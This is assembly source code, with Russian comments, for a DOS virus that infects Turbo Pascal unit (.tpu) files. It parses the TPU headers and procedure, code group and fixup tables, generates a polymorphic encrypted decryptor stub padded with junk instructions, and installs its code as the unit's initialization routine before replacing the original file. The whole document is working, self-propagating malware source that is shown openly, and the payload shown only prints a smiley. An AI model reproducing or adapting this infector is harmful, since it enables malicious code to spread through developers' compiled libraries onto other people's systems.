
include         rulez.inc

                org     100h
start:
                call    inittpucode
                lea     dx, test1
                call    infectfile

                call    inittpucode
                lea     dx, test2
                call    infectfile

                call    inittpucode
                lea     dx, test3
                call    infectfile

                mov     ax, 4c00h
                int     21h



include         random.inc



test1           db      'grapH.tpu',0
test2           db      'strings.tpu',0
test3           db      'app.tpu',0

tempfile        db      'temp$$$$.$$$',0

tpu_start:      call    tpuproc
                retf




tpuproc:        pusha
                push    ds es

                mov     al, ';'
                int     29h
                mov     al, ')'
                int     29h
                mov     al, 13
                int     29h
                mov     al, 10
                int     29h

                pop     es ds
                popa
                ret








inittpucode:    mve     es, cs
                lea     di, tpucode

                mov     al, 55h     ; PUSH BP
                stosb
                mov     ax, 0E589H  ; MOV BP, SP
                stosw

                call    tpurnd

                mov     ax, 076C4H  ; les si, [bp + 2]
                stosw
                mov     al, 2
                stosb

                call    tpurnd

                mov     al, 26h     ; es:
                stosb

                mov     ax, 748bh   ; mov si, [si - 4]
                stosw
                mov     al, -4
                stosb

                call    tpurnd

                mov     ax, 0C681h  ; add si, xxxx
                stosw
                push    di
                stosw

                call    tpurnd

newseg          equ     0B900h - 100h shr 4

                mov     al, 068h    ; push xxxx
                stosb
                mov     ax, newseg
                stosw

                call    tpurnd

                mov     al, 07h     ; pop es
                stosb

                call    tpurnd

                mov     al, 0bfh    ; mov di, xxxx
                stosb
                mov     ax, 0100h
                stosw

                call    tpurnd

                mov     al, 0b9h    ; mov cx, xxxx
                stosb
                mov     ax, 8192
                stosw

                call    tpurnd

                mov     al, 0fch    ; cld
                stosb

                call    tpurnd

                push    di          ; @@@:

                mov     ax, 0AC2Eh  ; CS: lodsb
                stosw

                call    tpurnd

                mov     ax, tpumaxdecr
                call    rnd
                xchg    bx, ax
                shl     bx, 1

                call    tpurnd

                mov     ax, tpudecr[bx]
                stosw

                call    tpurnd

                mov     ax, tpuencr[bx]
                mov     encryptor, ax

                mov     al, 0AAH    ; stosb
                stosb

                call    tpurnd

                mov     al, 0e2h    ; loop @@@
                stosb
                pop     ax
                sub     ax, di
                dec     ax
                stosb

                call    tpurnd

                mov     al, 9ah
                stosb
                mov     ax, offset tpu_start
                stosw
                mov     ax, newseg
                stosw

                call    tpurnd

                mov     al, 068h    ; push xxxx
                stosb
                mov     ax, newseg
                stosw

                call    tpurnd

                mov     al, 07h     ; pop es
                stosb

                call    tpurnd

                mov     al, 0bfh    ; mov di, xxxx
                stosb
                mov     ax, 0100h
                stosw

                call    tpurnd

                mov     al, 0b9h    ; mov cx, xxxx
                stosb
                mov     ax, 4096
                stosw

                call    tpurnd

                mov     al, 0b8h    ; mov ax, xxxx
                stosb
                mov     ax, 0720H
                stosw

                call    tpurnd

                mov     ax, 0abF3h  ; rep stosw
                stosw

                call    tpurnd

                mov     tpucall, di

                lea     ax, [di+1+-(offset tpucode)]
                mov     fixupptr, ax

                mov     al, 9ah
                stosb
                xor     ax, ax
                stosw
                stosw

                call    tpurnd

                mov     al, 5DH     ; POP BP
                stosb
                mov     al, 0CBh    ; RETF
                stosb

                lea     ax, [di + -(offset tpucode)]
                pop     bx
                mov     [bx], ax

                lea     si, start
                mov     cx, tpucodesize
@@1:            lodsb
encryptor       dw      ?
                stosb
                loop    @@1

                ret

tpurnd:         mov     ax, 3
                call    rnd
                dec     ax
                jz      @@_01
                dec     ax
                jz      @@_02
                dec     ax
                jz      @@_03
                ret

@@_01:          mov     al, 8ah

@@_01a:         stosb
                call    random
                and     ax, 0700h
                mov     al, ah
                shl     al, 3
                or      al, ah
                or      al, 0C0h
                stosb
                ret

@@_02:          mov     al, 8Bh
                jmp     @@_01a

@@_03:          mov     al, 90h
                stosb

                ret













infectfile:     mov     tpu_name, dx

                mov     ax, 3d00h
                int     21h
                jc      exit
                xchg    bx, ax

                push    bx
                mov     ax, 1220h
                int     2fh
                mov     bl, es:[di]
                mov     ax, 1216h
                int     2fh
                pop     bx
                mov     es:[di].sft_openmode, 2

                cmp     dword ptr es:[di].sft_size, 2000
                jbe     close

                mov     ah, 3fh
                lea     dx, buf
                mov     cx, 512
                int     21h

                cmp     dword ptr buf, 'QUPT'
                je      infecttpu

close:          mov     ah, 3eh
                int     21h

exit:           mve     ds, cs

                ret



infecttpu:      mve     es, cs

                mov     ax, 4200h
                cwd
                xor     cx, cx
                int     21h

                lea     dx, H1         ; читаем UH - хеадер TPUшника
                mov     cx, size TPU_STRUC
                call    readfile

                cmp     H1.tpu_ID, 'QUPT'  ; проверим хеадер на 'TPUQ'
                jne     @@close
                cmp     H1.tpu_NextUnit, 0
                jne     @@close
                cmp     H1.tpu_BrowserDataSize, 0    ; oops. во всех тестируемых мной
                jne     @@close        ; юнитах эта фишка равна нулю :(((

                cmp     H1.tpu_ALREDYinfected, 'Z0'
                je      @@close
                mov     H1.tpu_ALREDYinfected, 'Z0'

                xor     cx, cx         ; читаем UHLSF - source file list
                mov     dx, H1.tpu_FileNameTablePtr ; чтобы найти из него имя юнита
                call    seekfile
                lea     dx, buf        ; читаем в буфер
                mov     cx, H1.tpu_LineXLatePtr; вычислив размер UHLSF
                sub     cx, H1.tpu_FileNameTablePtr
                call    readfile

                lea     si, buf + 7    ; ptr на pascal-style имя сорца юнита
                lodsb                  ; размер имени
                xor     ah, ah
                xchg    cx, ax
                mov     dx, si         ; в имени может быть path, ищем имя
@@1:            lodsb
                cmp     al, '\'
                jne     @@2
                mov     dx, si
@@2:            loop    @@1
                mov     si, dx         ; si=имя с НАМ НЕНУЖНЫМ расширением

                lea     di, unitname   ; копируем одно только имя в unitname
                mov     cx, 8          ; а заодно посчитаем длину имени
                mov     unitlen, ch
@@4:            lodsb
                cmp     al, '.'
                je      @@3
                call    upcase         ; и сконвертим имя в UPPERCASE
                stosb
                inc     unitlen
                loop    @@4

@@3:            xor     cx, cx         ; читаем UHLDU - список юзаемых юнитов
                mov     dx, H1.tpu_LinkNamesTablePtr
                call    seekfile
                lea     dx, buf        ; в буфер
                mov     cx, H1.tpu_FileNameTablePtr   ; размер UHLDU
                sub     cx, H1.tpu_LinkNamesTablePtr
                call    readfile

                lea     si, buf        ; а теперь гиморойчик - надо найти
                mov     cx, 256        ; оффсет entry имени в UHLDU
@@6:            lodsb                  ; entry:
                cmp     al, unitlen    ; 00 00 00 00 ll nn nn nn nn ....
                jne     @@5            ; где ll=длина имени, nn = имя
                lea     dx, [si - 5 + -(offset buf)]
                pusha
                lea     di, unitname
                movzx   cx, al
@@7:            lodsb
                call    upcase
                scasb
                loope   @@7
                popa
                jz      @@8
@@5:            loop    @@6
                jmp     @@close        ; видно нас сглючило,
@@8:            mov     nameoffs, dl   ; хотя, кто знает... ;)  (нашли)

                mov     eax, dword ptr nameoffs    ; dont infect system.tpu
                cmp     eax, 'SYS'
                je      @@close

                mov     ax, H1.tpu_ConstGroupTablePtr   ; size UHCMT
                sub     ax, H1.tpu_GroupTablePtr   ; добавим в proc entry офсет entry
                mov     myentry.pt_CSegOfs, ax  ; нашего cmapа в cmaptable


                xor     cx, cx         ; считаем первую ентри из UHPMT
                mov     dx, H1.tpu_ProcTablePtr   ; - procmap table
                call    seekfile       ; ибо она - unit initialization proc
                lea     dx, firstentry
                mov     cx, 8
                call    readfile

                ; тут есть 2 варианта:
                ; либо и юнита есть initproc, и это пиздец, ;)
                ; либо у юнита нет initproc и это тоже пиздец ;))

                cmp     firstentry.pt_CSegOfs, 0FFFFh
                jne     @@a

                mov     mycodeseg.gr_FixupSize    , 0  ; C00L - фиксапы ненужны ;)

                mov     di, tpucall
                mov     cx, 5
                mov     al, 90h
                rep     stosb

                jmp     @@b

@@a:
;               придётся добавить 1 fix-up, чтобы вызвать старый init :(

                mov     mycodeseg.gr_FixupSize    , 8

@@b:


                ; а вот теперь можно начать buildить новый юнит

                lea     si, H1
                lea     di, H2
                mov     cx, size TPU_STRUC
                rep     movsb

                mov     ah, 3ch
                lea     dx, tempfile
                xor     cx, cx
                int     21h
                xchg    bp, ax          ; output handle будет в BP

                ; для начала переделаем хеадер

                mov     cx, 8           ; 8 байт добавим к uhcmt
                cmp     firstentry.pt_CSegOfs, 0FFFFh
                je      @@9
                add     cl, 8           ; 8 байт добавим к uhpmt
                add     H2.tpu_CodeFixupTableSize, 8      ; 8 байт добавим к uhzfv (fixup)
                add     H2.tpu_GroupTablePtr, 8

@@9:            add     H2.tpu_ConstGroupTablePtr, cx   ; соответственно надо
                add     H2.tpu_DataGroupTablePtr, cx   ; скорректировать поинтеры
                add     H2.tpu_DLLTablePtr, cx
                add     H2.tpu_LinkNamesTablePtr, cx
                add     H2.tpu_FileNameTablePtr, cx
                add     H2.tpu_LineXLatePtr, cx

                add     H2.tpu_DebugPtr, cx
                add     H2.tpu_SymbolTableSize, cx

                add     H2.tpu_CodeSize, tpucodesize  ; столько байт добавим к коду

                xchg    bp, bx          ; запишем хеадер
                lea     dx, h2
                mov     cx, size TPU_STRUC
                call    writefile
                xchg    bp, bx

                mov     dx, size TPU_STRUC ; seek(inhandle, $60)
                xor     cx, cx
                call    seekfile

                mov     cx, H1.tpu_ProcTablePtr    ; копируем хуйню до uhpmt
                sub     cx, size TPU_STRUC
                call    copybxbp

                ; добавим в начало procmaptable свою entry

                lea     dx, myentry
                mov     cx, 8
                xchg    bp, bx
                call    writefile
                xchg    bp, bx

                xor     cx, cx

                cmp     firstentry.pt_CSegOfs, 0FFFFh
                jne     @@10

                lea     dx, buf         ; считаем старую entry
                mov     cx, 8
                call    readfile

                mov     cx, -8

@@10:           add     cx, H1.tpu_ConstGroupTablePtr    ; копируем uhpmt + uhcmt
                sub     cx, H1.tpu_ProcTablePtr
                call    copybxbp




                lea     dx, mycodeseg   ; добавим mycodeseg к uhcmt
                mov     cx, 8
                xchg    bp, bx
                call    writefile
                xchg    bp, bx


                mov     cx, H1.tpu_SymbolTableSize; копируем оставшуюся хуйню
                sub     cx, H1.tpu_ConstGroupTablePtr
               ; inc     cx
                call    copybxbp


                ;;

                call    copy16
                call    read16

                mov     cx, H1.tpu_CodeSize
                call    copybxbp

                lea     dx, tpucode     ; копируем наш кодовый сегмент
                mov     cx, tpucodesize
                xchg    bp, bx
                call    writefile
                xchg    bp, bx

                call    copy16
                call    read16

                mov     cx, H1.tpu_ConstSize    ; ещё немного хуйни
                call    copybxbp

                call    copy16
                call    read16

                cmp     firstentry.pt_CSegOfs, 0FFFFh
                je      @@11

                ; и последняя гиморойнейшая хуетень - таблица ёбаных фиксапов

                ; uhzfv


                mov     si, H1.tpu_CodeFixupTableSize
                shr     si, 3

@@13:           lea     dx, buf
                mov     cx, 8
                call    readfile

                ;;
                mov     al, nameoffs
                cmp     buf.byte ptr 0, al
                jne     @@14

                mov     al, buf.byte ptr 1
                and     al, 0cfh
                jnz     @@14

                add     buf.word ptr 2, 8

@@14:           lea     dx, buf
                mov     cx, 8
                xchg    bp, bx
                call    writefile
                xchg    bp, bx
                ;;

                dec     si
                jnz     @@13


                lea     dx, fixup1
                mov     cx, 8
                xchg    bp, bx
                call    writefile
                xchg    bp, bx


                jmp     @@12

@@11:           mov     cx, H1.tpu_CodeFixupTableSize
                call    copybxbp

@@12:

                call    copy16
                call    read16

                mov     cx, H1.tpu_ConFixSize
                call    copybxbp

                call    copy16

@@done:         xchg    bp, bx
                mov     ah, 3eh
                int     21h
                xchg    bp, bx

                mov     ah, 3eh
                int     21h

                mov     ah, 41h
                mov     dx, 1234h
tpu_name        equ     word ptr $-2
                xor     cx, cx
                int     21h

                mov     ah, 56h
                mve     es, cs
                mov     di, dx
                lea     dx, tempfile
                int     21h

                ret


@@close:        mov     ah, 3eh
                int     21h

@@exit:         ret

readfile:       mov     ah, 3fh
                int     21h
                ret

writefile:      mov     ah, 40h
                int     21h
                ret

seekfile:       mov     ax, 4200h
                int     21h
                ret

copybxbp:       mov     si, cx
                jcxz    @@3

@@2:            mov     cx, 256
                cmp     si, cx
                ja      @@1
                mov     cx, si

@@1:            lea     dx, buf
                call    readfile

                xchg    bp, bx
                call    writefile
                xchg    bp, bx

                sub     si, cx
                jnz     @@2

@@3:            ret

copy16:         xchg    bp, bx

                mov     ax, 4201h
                cwd
                xor     cx, cx
                int     21h

                mov     cx, ax

                add     cx, 15
                and     cl, not 15

                sub     cx, ax

                mov     ah, 40h
                lea     dx, zero16
                int     21h

                xchg    bp, bx
                ret

read16:         mov     ax, 4201h
                cwd
                xor     cx, cx
                int     21h

                mov     cx, ax

                add     cx, 15
                adc     cx, 0
                and     cl, not 15

                sub     cx, ax

                mov     ah, 3fh
                lea     dx, buf
                int     21h

                ret

upcase:         cmp     al, 'a'
                jb      @@1
                cmp     al, 'z'
                ja      @@1
                add     al, 'A'-'a'
@@1:            ret

                db      'EOV'
codeend:

datastart:


tpudecr         label   word
                inc     al
                dec     al
                not     al
                neg     al
                ror     al, 1
                rol     al, 1
                xor     al, 55h
                add     al, 55h
                sub     al, 55h
tpumaxdecr      equ     ($-tpudecr)/2

tpuencr         label   word
                dec     al
                inc     al
                not     al
                neg     al
                rol     al, 1
                ror     al, 1
                xor     al, 55h
                sub     al, 55h
                add     al, 55h

                ; вот такой codemap entry добавим в codemap table

zero16          db      16 dup (0)


GroupRec        struc        ; an entry in the code group table
gr_Origin       dw      ?    ; starting offset--filled in by linker
gr_CodeSize     dw      ?    ; size of the code block
gr_FixupSize    dw      ?    ; size of its entry in the fixup table
gr_DebugPtr     dw      ?    ; offset into debug table, or $FFFF
                ends

; cmaprec
mycodeseg       GroupRec  <0,tpucodesize,?,0FFFFh>

                ; вот такую pmap entry добавим в procmap table
                ; причём добавим её в начало,
                ; чтобы стала она подпрограмкой инициализации юнита

;pmapentry       struc
;ProcWd1         dw      ?       ;
;ProcWd2         dw      ?       ; contains proc attribute flags?
;CSegOfs         dw      ?       ;
;CSegJmp         dw      ?       ; offset to entry point;  $FFFF if null
;                ends

ProcTableRec    struc           ; an entry in the procedure table
pt_Dunno        dw       ?     ; purpose is unknown
pt_Flags        dw       ?     ; flags
pt_CSegOfs      dw       ?     ; old: offset within CSeg Map; $FFFF if null
                               ; 7.0: an index into the Group table
pt_CSegJmp      dw       ?     ; old: constant data at start of the block
                               ; 7.0: offset to entry point;  $FFFF if null
                ends

myentry         ProcTableRec <0,0,?,tpuinit>

;FixupRec        struc          ; 7.0: an entry in the fixup table
;fx_Flags        dw       ?     ; INCORRECT??? bit flags indicating fixup type
;fx_Index        dw       ?     ; INCORRECT??? meaning depends on fxFlags
;fx_Offset       dw       ?
;fx_Location     dw       ?
;                ends

fixup1:
nameoffs        db      ?
                db      00110000b
                dw      8
                dw      0
fixupptr        dw      ?



viriisize       equ     $-start



tpucall         dw      ?

firstentry      ProcTableRec ?

unitlen         db      ?       ; тут храним имя юнита
unitname        db      8 dup (?)

tpu_STRUC              struc
tpu_ID                 dd      ?       ; +00   TPUsig                "TPUQ" signature
tpu_NextUnit           dw      ?       ; +04   NextUnit,             segment in memory for next unit
tpu_NextLibrary        dw      ?       ; +06   NextLibrary,          segment in memory for next library
tpu_UsesPtr            DW      ?       ; +08   UsesPtr,              offset to unit name/symbol table
tpu_HashTablePtr       DW      ?       ; +0A   ScopePtr,             offset to hash table
tpu_ProcTablePtr       DW      ?       ; +0C   ProcPtr,              offset to procedure table
tpu_GroupTablePtr      DW      ?       ; +0E   GroupPtr,             offset to Group table
tpu_ConstGroupTablePtr DW      ?       ; +10   ConGrPtr,             Const group table pointer
tpu_DataGroupTablePtr  DW      ?       ; +12   DatGrPtr,             Data group table pointer
tpu_DLLTablePtr        DW      ?       ; +14   DynaLinkPtr,          offset to DLL link names table
tpu_LinkNamesTablePtr  DW      ?       ; +16   LinkPtr,              offset to link names table
tpu_FileNameTablePtr   DW      ?       ; +18   NamePtr,              offset to filename table
tpu_LineXLatePtr       DW      ?       ; +1A   LineXlatePtr,         offset to line number translation table
tpu_DebugPtr           DW      ?       ; +1C   DebugPtr,             offset to line number table
tpu_SymbolTableSize    DW      ?       ; +1E   UnitSize,             symbol table size
tpu_BrowserDataSize    DW      ?       ; +20   BrowseSize,           browser data size
tpu_CodeSize           DW      ?       ; +22   CodeSize,             total code (bytes)
tpu_ConstSize          DW      ?       ; +24   ConstSize,            initialized data (bytes)
tpu_CodeFixupTableSize DW      ?       ; +26   FixupSize,            size of code fixup table
tpu_ConFixSize         DW      ?       ; +28   ConFixSize,           size of constant fixup section
tpu_DataSize           DW      ?       ; +2A   DataSize,             uninitialized data (bytes)
tpu_DScopePtr          DW      ?       ; +2C   DScopePtr,            debug scope pointer
tpu_UnitFlags          DW      ?       ;       UnitFlags,            1 if unit compiled with $N+, 2 if $O+
;  ufNPlus    = $0001
;  ufOPlus    = $0002
;  ufGPlus    = $0008
;  ufHuh      = $0010  ??
;  ufDOS      = $0000
;  ufDPMI     = $0100
;  ufWindows  = $0200
;  ufUnknown  = $1000  ??

tpu_LastObjectPtr      DW      ?       ;       LastObjectPtr,        pointer to last object in linked list
tpu_BrowserXRefs       DW      ?       ;       BrowserXrefs,         offset in browser data for cross-references
tpu_BroserStructs      DW      ?       ;       BrowserStructs        offset in browser data for structures
tpu_Private            DW      21-1 dup (?);   Private               array[1..21] of Word
tpu_AlredyInfected     DW      ?
                       ends

H1              TPU_STRUC ?
H2              TPU_STRUC ?

dta             dta_struc ?

buf             db      512 dup (?)

tpuinit         equ     0
tpucode         label   byte
tpucodesize     equ     8192

                end     start
